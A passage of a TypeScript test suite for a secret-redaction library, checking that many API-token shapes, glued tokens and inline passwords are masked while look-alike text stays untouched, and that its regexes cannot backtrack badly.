  'max_tokens=4096', 'input_tokens: 12345678', 'token_count: 12345678', 'tokens=99999999', 'primary_key=abc12345', 'sort_key: created_at_2026', 'public_key=abc12345xyz', 'keyboard: 12345678', 'compass=12345678', 'bypass=12345678', 'pass: 12 tests', 'password: required', 'author: someone1234',
  // near a prefix
  'npm_config_registry=https://registry.npmjs.org/', 'npm_package_version=1.2.3', 'sk-short', 'sk_test_x', 'sk_test_helpers', 'pk_live_' + an(24), 'cache-key-' + hex(32), 'xoxo-hugs-and-kisses', 'hf_token', 'secret_key_name', 'API-DOCS', 'glc_short', 'AIzaShort', 'key-short', 're_match', 'dp.pt.short', 'AKIA is a prefix', 'AKIAlowercase1234567',
  // prose and numbers that a saved note must keep (a mask in a note is for good)
  'Meeting: the cookie: stores your session for a day, ask Sam about renewal', 'cookie: my session bug', 'auth: 127.0.0.1:8080', 'pass: 1523/1523', 'token: 2026-11-01', 'token: CancellationTokenSource', 'Password: please-enter-your-password', 'secret: correcthorsebatterystaple',
  // Windows and relative paths
  'private_key=C:/keys/server_2026.pem', 'secret: C:/Users/me/secret1.txt', 'private_key=C:\\keys\\server_2026.pem', 'private_key=keys/server_2026.pem', 'private_key=Keys/Server_2026.pem', 'token: dist/assets/index-a1b2.js', 'secret=../conf/key2.txt',
  // names that look like tokens, and things that only start like one
  'nfc_normalize_unicode_string_with_long_name', 'sgp_' + 'cross_validation_results_for_the_final_model_fit', 'sbp_' + 'cross_validation_results_for_the_final_model_fit', 'glc_' + 'cross_validation_results_for_the_final_model', 'figd_' + 'cross_validation_results_for_the_final', 'cfk_' + 'cross_validation_results_for_the_final_model', 'tskey-auth-kube-config-documentation-page', 'cfut_' + 'cross_validation_results_for_model_fitting_v2', 'gldt-' + 'cross-validation-results-v2-final', 'sgp_' + 'CrossValidation_ResultsForThe_FinalModelFitting_LongName', 'sbp_' + 'cross_validation_results_for_the_final_model_v2', 'ACCAGTTGCATGCATGCATG', 'ABIAGATTACAGATTACAGA', 'ico-' + hex(32) + '.css',
  // second review of #1015: lower-case words, timestamps, lower-case paths, dotted names, prose
  'token: gpt-4o-mini', 'token: cl100k_base', 'auth: oauth2-proxy', 'auth: fix-login-42', 'password: reset-flow-v2', 'token: rework-2026', 'secret: my-secret-1', 'password: must-include-1-digit', 'Token: 2026-11-01T10:00:00Z', 'secret: src/foo1', 'cookie: a=b is the format', 'token = config.token2;',
  // a token shape glued to a word is not one (except `sk-ant-`, on purpose)
  'x' + 'np' + 'm_' + an(36), 'my' + 'sk' + '_live_' + an(24), 'a' + 'gh' + 'p_' + an(36),
  // `-u` away from curl, and curl with no password
  'git push -u origin:main', 'docker run -u 1000:1000 img', 'curl -u me https://h', 'curl -H "Accept: text/plain" https://h:8080/x',
  // prose
  'The password must be at least 8 characters', 'Enter your token: then press return', 'the -----BEGIN marker', 'BEGIN PRIVATE KEY without dashes',
];
for (const s of STAYS) {
  assert.strictEqual(redact(s, {}), s, `stays: ${s.slice(0, 50)}`);
  assert.strictEqual(maskTokenShapes(s, '[redacted]'), s, `stays in maskTokenShapes: ${s.slice(0, 50)}`);
}

// The same list as running text: STAYS joined by line breaks, and in blocks of 5, must stay whole too, so a rule that looks across lines (the mysql `\\` continuation, a cookie scan) cannot over-mask a line from its neighbour (pre-review of #1243: a per-line comparison cannot see that).
{
  for (const sep of ['\n', '\r\n']) {
    for (let i = 0; i < STAYS.length; i += 5) {
      const block = STAYS.slice(i, i + 5).join(sep);
      assert.strictEqual(redact(block, {}), block, `stays as lines (${JSON.stringify(sep)}, from ${i}): ${block.slice(0, 50)}`);
    }
  }
}

// Nothing the mask hid before T137 shows now (review of #1015: a digit guard on `glpat-` left 3% of real tokens visible; every sample here used to hold a digit, so no test saw it).
// The samples are drawn from the old rules' own classes under profiles a fixed sample never has (no digit, one case, words), in the contexts the old mask hid them in.
{
  const surfaces: Record<string, (s: string) => string> = { redact: (s) => redact(s, {}), shapes: (s) => maskTokenShapes(s, '[redacted]'), command: (s) => maskSecretCommand(s, {}), url: (s) => maskSecretUrl(s, {}), args: (s) => maskSecretArgs(s.split(' '), {}).join(' '), note: (s) => maskNoteText(s).text };
  let held = 0;
  for (const h of heldSamples(4000)) {
    for (const label of heldSurfaces(h)) {
      held++;
      const left = longestSurvivor(h.secret, surfaces[label](h.text));
      assert.strictEqual(left, 0, `${label} shows ${left} characters of ${h.shape} (${h.profile}) in context ${h.context}: ${h.text.slice(0, 16)}…`);
    }
    if (h.bare) assert.strictEqual(longestSurvivor(h.secret, maskBareTokenShapes(h.text, '[s]')), 0, `maskBareTokenShapes shows ${h.shape} (${h.profile}) in context ${h.context}`);
  }
  assert.ok(held > 10000, `the held samples ran: ${held}`);
  // The case that got through, by name: a real `glpat-` body with no digit, and words, in every surface
  for (const body of ['aBcDeFgHiJkLmNoPqRsT', 'abcdefghijklmnopqrst', 'ABCDEFGHIJKLMNOPQRST', 'cross-validation-results-v2-final', 'aB_cD-eF.gHiJkLmNoPqRsT']) {
    for (const [label, f] of Object.entries(surfaces)) assert.ok(!f('see gl' + 'pat-' + body + ' now').includes(body), `${label} hides a glpat- body of ${body}`);
  }
  // Each rule of before comes first: a prefix added later cannot take the head of an older token and show its tail
  for (const glue of ['fo' + '1_', 're' + '_abcdefgh_', 'sb_' + 'secret_', 'sha' + '256~', 'rk' + '_live_', 'hv' + 's.', 'dp' + '.pt.']) {
    for (const t of ['github' + '_pat_' + an(82), 'sk' + '-proj-' + an(90), 'gl' + 'pat-' + an(90), 'ey' + 'J' + an(30) + '.' + an(30) + '.' + an(30), 'xo' + 'xb-' + an(70)]) assert.ok(!redact(glue + t, {}).includes(t.slice(-8)), `${glue} before ${t.slice(0, 8)}…`);
  }
  // a `Bearer` in a place a later rule reads as a password keeps its value hidden, also in a note where a mark splits the value
  for (const t of ['machine h pass' + 'word Bea' + 'rer ab12~cd3', 'curl -u me:Bea' + 'rer ab12~cd3 x']) assert.ok(!maskNoteText(t).text.includes('cd3'), `note: ${t}`);
  // a doubled scheme word: the value after it is still the value
  assert.strictEqual(redact('Authori' + 'zation: Bearer Bearer ' + an(12) + ' x', {}), 'Authorization: [redacted] x');
  // The JWT scan finds what the regex it replaced finds, on text made of the characters that matter (`eyJ`, dots, `_`, `25XX`, `%`, long runs)
  for (const t of jwtFuzzTexts(3000)) {
    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `the JWT scan on ${t.slice(0, 60)}`);
  }
  // ... and at each length limit, also for an `eyJ` inside a run too long to start at
  const x = (n: number): string => 'bcdf'.repeat(Math.ceil(n / 4)).slice(0, n);
  for (const a of [4, 5, 6, 4095, 4096, 4097]) for (const b of [4, 5, 6, 4095, 4096, 4097]) for (const c of [4, 5, 6, 4096, 4097]) {
    const t = 'ey' + 'J' + x(a) + '.' + x(b) + '.' + x(c);
    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `the JWT limits ${a} ${b} ${c}`);
  }
  for (let k = 4088; k <= 4098; k++) {
    const t = 'ey' + 'J' + x(5000) + '2541' + 'ey' + 'J' + x(k) + '.bcdfg.bcdfg';
    assert.strictEqual(maskBareTokenShapes(t, '[s]'), t.replace(JWT_HELD, () => '[s]'), `an inner eyJ ${k} from the end of its run`);
  }
  assert.strictEqual(redact('2541' + 'ey' + 'J' + an(5) + '.' + an(5) + '.' + an(5), {}), '2541[redacted]', 'a JWT after a bare 25XX');
}
// Listed limit (secret-coverage.md, "partial"): a shape added by T137 under the digit guard passes when its body has no digit; each is added on purpose, so a change here is a choice.
for (const pre of ['bedrock-' + 'api-key-', 'ya' + '29.', 'GOC' + 'SPX-', 'cf' + 'ut_', 'vc' + 'c_', 'nf' + 'p_', 'rn' + 'd_', 'xa' + 'i-', 'nv' + 'api-', 'cs' + 'k-', 'pc' + 'sk_', 'fw' + '_', 'BB' + 'DC-', 'CF' + 'PAT-', 'un' + 'key_', 'bk' + 'ua_', 'li' + 'n_oauth_', 'sk' + '.eyJ', 'HR' + 'KU-', 'sb' + 'p_', 'sb_' + 'secret_', 'psc' + 'ale_tkn_', 'hv' + 's.', 'dp' + '.pt.', 'ts' + 'key-', 'gl' + 'dt-', 'gl' + 'rt-', 'gl' + 'ft-', 'gl' + 'ffct-', 'gl' + 'imt-', 'gl' + 'agent-', 'gl' + 'oas-', 'gl' + 'soat-', 'gl' + 'ptt-', 'gl' + 'cbt-', 'GR' + '1348941', 'ATA' + 'TT3', 'CCI' + 'PAT_', 'sg' + 'p_', 'tv' + 'ly-', 'ls' + 'v2_pt_', 'py' + 'pi-Ag', 'dc' + 'kr_pat_', 'SG' + '.', 'sq' + '0atp-', 'pd' + 'l_live_', 'gl' + 'c_', 'NR' + 'AK-', 'sl' + '.', '1/' + '/0', 'AK' + 'LT', 'AT' + 'BB']) {
  const letters = run(120, 'aBcDeFgHiJkLmNoPqRsTuVwXyZ');
  assert.strictEqual(redact(pre + letters, {}), pre + letters, `listed limit, no digit in the body: ${pre}`);
  assert.ok(redact(pre + an(120), {}).includes('[redacted]'), `with a digit it is hidden: ${pre}`);
}
// The end of a fixed-length shape: one more letter or digit and it is not that token (a word that only starts like one); anything else ends it
for (const [start, more] of [['AK' + 'IA' + up(16), 'A'], ['AK' + 'IA' + up(16), '7'], ['AS' + 'IA' + up(16), 'a'], ['AB' + 'IA' + up(16), 'A'], ['AC' + 'CA' + up(16), '7'], ['A3' + 'TA' + up(16), 'a'], ['ke' + 'y-' + hex(32), 'a'], ['ke' + 'y-' + hex(32), 'Z'], [hex(32) + '-' + 'us12', '3'], [hex(32) + '-' + 'us12', 'x'], ['1234567' + '89012345' + '|' + an(40), 'a'], ['AP' + 'I-' + up(26), 'A'], ['AP' + 'I-' + up(26), '7']]) {
  assert.strictEqual(redact(`see ${start}${more} now`, {}), `see ${start}${more} now`, `not this token with one more character: ${start.slice(0, 8)}…${more}`);
  for (const end of [' ', '.', '-', '_', '"', ':']) assert.ok(!redact(`see ${start}${end}now`, {}).includes(start), `the token ends at "${end}": ${start.slice(0, 8)}…`);
}

// Linear, part 1, with no clock: no pattern has a repeated group that holds a variable-length part, so backtracking cannot multiply.
{
  // Walks the source: for each group closed by an unbounded quantifier, is there a variable quantifier inside it? Only a group, not a class.
  const nested = (src: string): string | undefined => {
    const stack: Array<{ variable: boolean }> = [{ variable: false }];
    for (let i = 0; i < src.length; i++) {
      const c = src[i];
      if (c === '\\') { i++; continue; }
      if (c === '[') { i++; if (src[i] === '^') i++; if (src[i] === ']') i++; while (i < src.length && src[i] !== ']') { if (src[i] === '\\') i++; i++; } continue; }
      if (c === '(') { stack.push({ variable: false }); continue; }
      if (c === '+' || c === '*') { stack[stack.length - 1].variable = true; continue; }
      if (c === '{') {
        const e = src.indexOf('}', i);
        const [lo2, hi2] = src.slice(i + 1, e).split(',');
        if (hi2 !== undefined && hi2 !== lo2) stack[stack.length - 1].variable = true;
        i = e;
        continue;
      }
      if (c === ')') {
        const g = stack.pop() as { variable: boolean };
        const rest = src.slice(i + 1, i + 24);
        const q = /^(?:\+|\*|\{[0-9]+,\})/.test(rest);
        if (q && g.variable) return src.slice(Math.max(0, i - 40), i + 8);
        // a bounded repeat of a variable part, or a plain group: its inside is variable for the outer group too
        if (g.variable || /^(?:\?|\+|\*|\{[0-9]+,[0-9]*\})/.test(rest)) stack[stack.length - 1].variable = true;
      }
    }
    return undefined;
  };
  assert.ok(nested('(?:a+)+'), 'the walker sees a nested quantifier');
  assert.ok(nested('(?:a{1,3}b)*c'), 'the walker sees a bounded part inside an unbounded repeat');
  assert.strictEqual(nested('(?:ab|%[0-9]{2}){8,}'), undefined, 'a fixed-width part is fine');
  assert.strictEqual(nested('[a+]+(?:x){1,2}'), undefined, 'a class is not a group');
  const sources = _maskSourcesForTest();
  assert.ok(sources.length > 15, 'the sources are listed');
  for (const src of sources) assert.strictEqual(nested(src), undefined, `nested quantifier in ${src.slice(0, 60)}`);
  // review of PR 1317, round 2: a lookbehind holds no unbounded quantifier (`*`, `+`, `{n,}`): it is retried at every position and walks back over the whole run, quadratic on some V8 versions
  // (the unbounded quote run in the lookbehind of `named` took 3.5 s at 8,000 quotes on the reviewer's machine and not on Node 24, so the check is on the source, not on a clock)
  const lookbehindUnbounded = (src: string): string | undefined => {
    const flat = src.replace(/\\./g, '__').replace(/\[(?:[^\]\\]|\\.)*\]/g, '_');
    for (let i = flat.indexOf('(?<'); i >= 0; i = flat.indexOf('(?<', i + 1)) {
      if (flat[i + 3] !== '=' && flat[i + 3] !== '!') continue;
      let depth = 0;
      let j = i;
      for (; j < flat.length; j++) { if (flat[j] === '(') depth++; else if (flat[j] === ')' && --depth === 0) break; }
      const inside = flat.slice(i, j + 1);
      if (/[*+]|\{[0-9]+,\}/.test(inside.replace(/^\(\?<[=!]/, ''))) return src.slice(i, i + 60);
    }
    return undefined;
  };
  assert.ok(lookbehindUnbounded('a(?<=x*)b'), 'the walker sees an unbounded lookbehind');
  assert.ok(lookbehindUnbounded('a(?<!(?:x|y)+)b'), 'the walker sees an unbounded repeat of a group in a lookbehind');
  assert.strictEqual(lookbehindUnbounded('a(?<=[a-z]{1,3}\\*?)b(?<![A-Za-z])'), undefined, 'a bounded lookbehind is fine');
  for (const src of sources) assert.strictEqual(lookbehindUnbounded(src), undefined, `#1317 round 2: an unbounded quantifier in a lookbehind: ${src.slice(0, 60)}`);
}

// Linear, part 2 (adversarial runs): the `shapes` part of test-redact-growth.ts.

// Glued tokens (issue #1233, spec 012 FR-169): each token of a back-to-back run is masked whole, not only the first.
{
  const second = an(36).split('').reverse().join('');
  for (const t of ['gh' + 'p_', 'gh' + 'o_', 'gh' + 'u_', 'gh' + 's_', 'gh' + 'r_', 'np' + 'm_', 'github' + '_pat_', 'sk' + '-', 'xo' + 'xb-']) {
    const n = t.startsWith('github') ? 82 : 36;
    const bodies = [an(n), an(n + 3).slice(3), second.slice(0, 36).padEnd(n, 'q')];
    for (const k of [2, 3]) {
      const text = bodies.slice(0, k).map((b) => t + b).join('');
      const out = redact(text, {});
      for (const b of bodies.slice(0, k)) assert.ok(!out.includes(b.slice(0, 12)) && !out.includes(b.slice(-12)), `glued x${k}: ${t}… leaves a body readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
      assert.strictEqual(out, '[redacted]', `glued x${k}: ${t}… is one mask`);
    }
  }
  // Every sample of every bare-token family, twice and three times back to back: one mask, nothing readable. A family added to FAMILIES is covered by this loop.
  const CONTEXT = new Set(['authorization', 'cookie', 'cookieQuoted', 'curlUser', 'urlCredential', 'copilotTid', 'queryValue', 'named', 'netrc', 'bearer', 'jwt', 'keyBlock', 'slackHook', 'discordHook', 'teamsHook', 'telegram', 'discordBot', 'slackLegacy', 'skAntGlued']);
  /** `[KNOWN GAP]` (spec 012 FR-169): shapes whose body has a fixed length and must END on a character that is not a letter or digit (`NOT_AFTER`, `NOT_B64_AFTER`), so a glued run is not a token at all. The loop checks each stays unmasked, so a fix that covers one fails here until it leaves the list. */
  const GLUE_GAP = new Set(['AKIAAB3D', 'ASIAAB3D', 'ABIAAB3D', 'ACCAAB3D', 'A3TAAB3D', 'ABSKaB3d', 'AIzaaB3d', 'aB38Q~aB', '_a.8Q~aB', '~ab8Q~aB', '.ab8Q~aB', '1//0aB3d', 'oy2a3b6c', 'cioaB3dE', '4b1daB3d', 'dapi0a1b', 'cmVmdaB3', 'key-0a1b', '0a1b2c3d', 'SK0a1b2c', '12345678', 'ico-aB3d', 'API-AB3D', 'EAAAaB3d']);
  let glueTested = 0;
  for (const [family, samples] of Object.entries(FAMILIES)) {
    if (CONTEXT.has(family)) continue;
    for (const sample of samples) {
      const wholes = [2, 3].map((k) => {
        const out = redact(sample.repeat(k), {});
        const whole = out.includes('[redacted]') && !/[A-Za-z0-9]{8}/.test(out.replace(/\[redacted\]/g, ''));
        if (!whole && !GLUE_GAP.has(sample.slice(0, 8))) assert.fail(`${family}: glued x${k} of ${sample.slice(0, 8)}… leaves a body readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>').slice(0, 80)}`);
        return whole;
      });
      if (GLUE_GAP.has(sample.slice(0, 8))) assert.ok(wholes.includes(false), `${family}: ${sample.slice(0, 8)}… glued is now masked: take it off GLUE_GAP`);
      else glueTested += 2;
    }
  }
  assert.ok(glueTested > 150, `the glued loop ran: ${glueTested}`);
  // Every ordered pair of the GitHub and npm families (issue #1233, review of PR #1235), at their real lengths: `github_pat_` is 22 characters, `_`, 59 characters.
  {
    const ALNUM = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let seed = 20261106; // seeded, so a failing chain fails the same way
    const rnd = (n: number): number => { seed = (Math.imul(seed, 1103515245) + 12345) >>> 0; return (seed >>> 8) % n; };
    const chars = (n: number): string => { let o = ''; for (let i = 0; i < n; i++) o += ALNUM[rnd(ALNUM.length)]; return o; };
    const fam: Array<[string, () => string]> = [['gh' + 'p_', () => chars(36)], ['gh' + 'o_', () => chars(36)], ['gh' + 'u_', () => chars(36)], ['gh' + 's_', () => chars(36)], ['gh' + 'r_', () => chars(36)], ['github' + '_pat_', () => chars(22) + '_' + chars(59)], ['np' + 'm_', () => chars(36)]];
    const check = (parts: Array<[string, string]>, label: string): void => {
      const out = redact(parts.map(([p2, b]) => p2 + b).join(''), {});
      for (const [, b] of parts) for (const piece of b.split('_')) assert.ok(!out.includes(piece.slice(0, 12)) && !out.includes(piece.slice(-12)), `${label}: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
      assert.strictEqual(out, '[redacted]', `${label}: one mask`);
    };
    for (const [a, ga] of fam) for (const [b, gb] of fam) {
      const A: [string, string] = [a, ga()];
      const B: [string, string] = [b, gb()];
      check([A, B], `pair ${a}${b}`);
      check([A, B, A], `triple ${a}${b}${a}`);
      check([A, B, B], `triple ${a}${b}${b}`);
    }
    // seeded chains of 2 to 5 tokens from the three families
    for (let i = 0; i < 600; i++) {
      const n = 2 + rnd(4);
      const parts: Array<[string, string]> = [];
      for (let k = 0; k < n; k++) { const [pre, g] = fam[rnd(fam.length)]; parts.push([pre, g()]); }
      check(parts, `chain ${i}: ${parts.map(([p2]) => p2).join('')}`);
    }
  }
  // Issue #1237 (spec 012 FR-173): tokens of DIFFERENT families written back to back. Every ordered pair of the bare-token samples of FAMILIES (a family added later is covered) is
  // one run of masks with no run of 8 letters or digits left; then the issue's own pairs by name.
  {
    const left = (out: string): string => out.replace(/\[redacted\]/g, '');
    const readable = (out: string): boolean => /[A-Za-z0-9]{8}/.test(left(out));
    const flat: Array<[string, string]> = [];
    for (const [family, samples] of Object.entries(FAMILIES)) {
      if (CONTEXT.has(family)) continue;
      for (const sample of samples) if (!GLUE_GAP.has(sample.slice(0, 8))) flat.push([family, sample]);
    }
    const sampleOf = (prefix: string): string => { const f = flat.find(([, x]) => x.startsWith(prefix)); assert.ok(f, `a sample starts with ${prefix}`); return f![1]; };
    // the issue's repro: A = 'sk-' + 40, B = 'hf_' + 30; the same with glpat- + 20, xoxb- + 20, and B a PREFIXED family
    const A: Array<[string, string]> = [['sk-', 'sk-' + an(40)], ['glpat-', 'glpat-' + an(20)], ['xoxb-', 'xoxb-' + an(20)], ['xapp-', 'xapp-1-' + an(20)], ['gh' + 'p_', 'gh' + 'p_' + an(36)], ['github' + '_pat_', 'github' + '_pat_' + an(22) + '_' + an(59)]];
    const B: Array<[string, string]> = [['hf_', 'hf' + '_' + an(30)], ['vcc_', 'vc' + 'c_' + an(50)], ['lin_', sampleOf('lin_')], ['sbp_', sampleOf('sbp_')], ['AstraCS', sampleOf('AstraCS')], ['ya29.', sampleOf('ya29.')]];
    for (const [la, a] of A) for (const [lb, b] of B) {
      const out = redact(a + b, {});
      assert.ok(out.includes('[redacted]') && !readable(out), `#1237: ${la} then ${lb}: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
      assert.ok(!out.includes(b.slice(-12)), `#1237: ${la} then ${lb}: the end of the second token is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
    }
    // a base64 shape first (AKLT, GOOG1, LTAI, AKCp, eyJrIjoi, an X bearer), then a token of another family
    const B64: Array<[string, string]> = [['AKLT', sampleOf('AK' + 'LT')], ['GOOG1', sampleOf('GO' + 'OG1')], ['LTAI', sampleOf('LT' + 'AI')], ['AKCp', 'AK' + 'Cp' + an(60)], ['eyJrIjoi', 'ey' + 'JrIjoi' + an(70)], ['X bearer', sampleOf('AAAAAAAAAAAAAAAAAAAAAAB')]];
    for (const [la, a] of B64) for (const [lb, b] of B) {
      const out = redact(a + b, {});
      assert.ok(out.includes('[redacted]') && !readable(out), `#1237: ${la} then ${lb}: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
    }
    // the eight prefixed pairs: `sk.eyJ` or `ops_eyJ` before `pat.` or `sc_`; `sc_` before `fm1r_`, `fm2_`, `ops_eyJ` or `xkeysib-`
    const pairs: Array<[string, string]> = [['sk.eyJ', 'pat.'], ['sk.eyJ', 'sc_'], ['ops_eyJ', 'pat.'], ['ops_eyJ', 'sc_'], ['sc_', 'fm1r_'], ['sc_', 'fm2_'], ['sc_', 'ops_eyJ'], ['sc_', 'xkeysib-']];
    for (const [pa, pb] of pairs) {
      const out = redact(sampleOf(pa) + sampleOf(pb), {});
      assert.ok(!readable(out), `#1237: ${pa} then ${pb}: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
    }
    // all of them, every order
    let n = 0;
    for (const [fa, a] of flat) for (const [fb, b] of flat) {
      const out = redact(a + b, {});
      if (readable(out) || !out.includes('[redacted]')) assert.fail(`#1237: pair ${fa} ${a.slice(0, 8)}… + ${fb} ${b.slice(0, 8)}…: a body is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>').slice(0, 80)}`);
      n++;
    }
    assert.ok(n > 15000, `#1237: the pair loop ran: ${n}`);
    // pre-review of PR 1317: a base64 token has `/` and `+` in its body, and the first token's body stops there, so the rest starts with one of them (the pair loop above has no such sample)
    {
      const abs = 'AB' + 'SK' + an(30) + '/' + an(30) + '+' + an(50) + '==';
      for (const [la, a] of A) {
        const out = redact(a + abs, {});
        assert.ok(out.includes('[redacted]') && !readable(out), `#1237: ${la} then ABSK with / and +: a rest after the first / or + is readable in ${out.replace(/[A-Za-z0-9]{12,}/g, '<LEAK>')}`);
      }
      const gh2 = 'gh' + 'p_' + an(36);
      assert.strictEqual(redact(gh2 + '/v1/chat/completions', {}), '[redacted]/v1/chat/completions', '#1237: a short path after a token stays (fewer than 32 letters and digits after a /)');
      assert.strictEqual(redact(gh2 + '+' + an(31), {}), '[redacted]+' + an(31), '#1237: 31 letters and digits after a + stay');
      assert.strictEqual(redact(gh2 + '+' + an(32), {}), '[redacted]', '#1237: 32 letters and digits after a + are the rest of a token');
      // pre-review of PR 1317: the counts and the start characters are pinned from both sides, so a threshold moved by one or a start character added is caught
      assert.strictEqual(redact(gh2 + '.' + an(8), {}), '[redacted]', '#1237: exactly 8 letters and digits after a . are the rest of a token (GLUE_MIN)');
      assert.strictEqual(redact(gh2 + '_' + an(16), {}), '[redacted]', '#1237: exactly 16 letters and digits after a _ are the rest of a token (GLUE_MIN_UNDERSCORE)');
      assert.strictEqual(redact(gh2 + '_' + an(15), {}), '[redacted]_' + an(15), '#1237: 15 after a _ stay (GLUE_MIN_UNDERSCORE)');
      assert.strictEqual(redact(gh2 + '/repos/owner/project', {}), '[redacted]/repos/owner/project', '#1237: a repository path after a token stays (GLUE_START has no / below 32)');
      assert.strictEqual(redact(gh2 + '/' + an(32), {}), '[redacted]', '#1237: 32 letters and digits after a / are the rest of a token (GLUE_MIN_B64)');
      assert.strictEqual(redact(gh2 + '=' + an(40), {}), '[redacted]=' + an(40), '#1237: `=` does not start a glued rest (GLUE_START)');
      assert.strictEqual(redact(gh2 + '?' + an(40), {}), '[redacted]?' + an(40), '#1237: `?` does not start a glued rest (GLUE_START)');
    }
    // pre-review of PR 1317: the GOOG1 rule has the base64 list's start and line-break rules (each asserted alone: remove one and its own line fails)
    {
      const g1 = 'GO' + 'OG1' + up(44);
      assert.strictEqual(redact('ab/' + g1, {}), 'ab/' + g1, '#1237: GOOG1 after a / is base64 text, not a key (the start rule)');
      assert.strictEqual(redact(an(76) + '\n' + g1 + '\n' + an(76), {}), an(76) + '\n' + g1 + '\n' + an(76), '#1237: GOOG1 as one line of a wrapped base64 block stays (the line-break rules)');
      assert.strictEqual(redact(g1 + '\n' + an(76), {}), g1 + '\n' + an(76), '#1237: GOOG1 before a base64 line stays (the line-break lookahead)');
      assert.strictEqual(redact(an(76) + '\n' + g1, {}), an(76) + '\n' + g1, '#1237: GOOG1 after a base64 line stays (the line-break lookbehind)');
      assert.strictEqual(redact('key ' + g1, {}), 'key [redacted]', '#1237: a GOOG1 key after a space is a key');
    }
    // pre-review of PR 1317: an empty mask finds itself at every place; the scan must still end (a child with a timeout: a loop that does not end cannot be caught in this process)
    {
      const child = spawnSync(process.execPath, ['-e', `const r=require(${JSON.stringify(path.join(__dirname, '..', 'src', 'shared', 'redact'))});r.maskTokenShapes(' a ['+'x]b '+'c'.repeat(9)+' d','');process.stdout.write('ok')`], { timeout: 8000, encoding: 'utf8' });
      assert.ok(!child.error && child.status === 0 && child.stdout === 'ok', `#1237: maskTokenShapes with an empty mask returns (no endless scan): ${child.error ? String(child.error.message) : `status ${child.status}`}`);
    }
    // what stays: a separator keeps two masks, and a short rest (a port, `.git`, an encoded space, a short word) is not a second token
    const gh = 'gh' + 'p_' + an(36);
    assert.strictEqual(redact(gh + '.git', {}), '[redacted].git', '#1237: `.git` after a token stays');
    assert.strictEqual(redact(gh + ':8080', {}), '[redacted]:8080', '#1237: a port after a token stays');
    assert.strictEqual(redact(gh + '%20ok', {}), '[redacted]%20ok', '#1237: an encoded space and a short word stay');
    assert.strictEqual(redact(gh + '_' + an(15), {}), '[redacted]_' + an(15), '#1237: a suffix of 15 characters after `_` stays, as in FR-169');
    assert.strictEqual(redact(gh + '.' + an(7), {}), '[redacted].' + an(7), '#1237: 7 characters after a token stay');
    assert.strictEqual(redact(gh + '/x', {}), '[redacted]/x', '#1237: a path after a token stays');
    assert.strictEqual(redact(gh + ' hf_' + an(30), {}), '[redacted] [redacted]', '#1237: a space keeps two masks');
    assert.strictEqual(redact('Key is [redacted]' + an(10) + '.', {}), 'Key is [redacted].', '#1237: the full stop of a sentence after a glued rest stays');
    assert.strictEqual(redact('Key is [redacted]' + an(10) + ': next', {}), 'Key is [redacted]: next', '#1237: a colon after a glued rest stays');
    assert.strictEqual(redact('go' + 'og1 ' + 'GO' + 'OG1' + up(10), {}), 'go' + 'og1 ' + 'GO' + 'OG1' + up(10), '#1237: a short GOOG1 run is no key');
  }
  // F1: a plain list of prefixes is no token (the `_` after a lead counts only after a full body of letters and digits)
  for (const t of ['the prefixes ' + 'gh' + 'p_gho_ghu_ghs_ghr_gh' + 'p_gho_ghu_', ('gh' + 'p_').repeat(40), ('np' + 'm_gh' + 'p_').repeat(20)]) assert.strictEqual(redact(t, {}), t, `a prefix list stays: ${t.slice(0, 30)}`);
  // The lookbehind is only for a lead the swallow list names: a body ending in `gh` and another letter, then `_`, is not glued
  assert.strictEqual(redact('gh' + 'p_' + an(20) + 'ghx_' + an(8), {}), '[redacted]_' + an(8), 'a body ending in ghx stops at the underscore');
  // The extension never shortens a mask: a token starting inside the first one and ending before its end changes nothing
  assert.strictEqual(redact('cf' + 'ut_' + an(40) + 'AB' + 'IA' + up(16) + '-xyz', {}), '[redacted]', 'the mask only grows');
  // A glued short rest after a token (no full body) is still taken, as before; a space or a word between keeps both masked
  assert.ok(!redact('gh' + 'p_' + an(36) + 'gh' + 'p_' + an(8), {}).includes('gh' + 'p_'), 'a short glued rest');
  assert.strictEqual(redact(['gh' + 'p_' + an(36), 'gh' + 'o_' + an(36)].join(' x '), {}), '[redacted] x [redacted]', 'separated tokens');
}

// Issue #1227 (spec 012 FR-170, T144): shapes `redact` left readable. Every value is made up and split at run time.
{
  const aws = 'wJalrXUtn' + 'FEMI/K7MDENG/bPxRfi' + 'CYEXAMPLEKEY'; // the 40-character example every AWS page shows
  const eq = (input: string, want: string, label: string): void => assert.strictEqual(redact(input, {}), want, label);
  // 1. mysql -pPASSWORD: the password glued to the flag
  eq('mysql -p' + 'hunter2 -u root', 'mysql -p[redacted] -u root', 'mysql -p: glued password');
  eq('mysql -u root -p' + 'hunter2 db', 'mysql -u root -p[redacted] db', 'mysql -p: after other flags');
  eq('mysqldump -uroot -p' + 'S3cret --all-databases', 'mysqldump -uroot -p[redacted] --all-databases', 'mysql -p: mysqldump');
  eq('mariadb -h db.example -p' + 'S3cret', 'mariadb -h db.example -p[redacted]', 'mysql -p: mariadb');
  eq("mysql -p'my pass word' db", 'mysql -p[redacted] db', 'mysql -p: single-quoted with spaces');
  eq('mysql -p"my pass word" db', 'mysql -p[redacted] db', 'mysql -p: double-quoted with spaces');
  for (const t of ['mysql -p db', 'mysql -u root -p', 'mysql -P 3306 -u root db', 'mysql -P3306 -u root', 'mysql --password db', 'ls -pa /tmp', 'git push -pf origin', 'mysql --protocol=tcp db'])
    eq(t, t, `mysql -p stays: ${t}`);
  // 2. an AWS secret after a space
  eq('aws configure set aws_secret_' + 'access_key ' + aws, 'aws configure set aws_secret_' + 'access_key [redacted]', 'aws secret after a space: configure set');
  eq('AWS_SECRET_' + 'ACCESS_KEY ' + aws, 'AWS_SECRET_' + 'ACCESS_KEY [redacted]', 'aws secret after a space: upper case name');
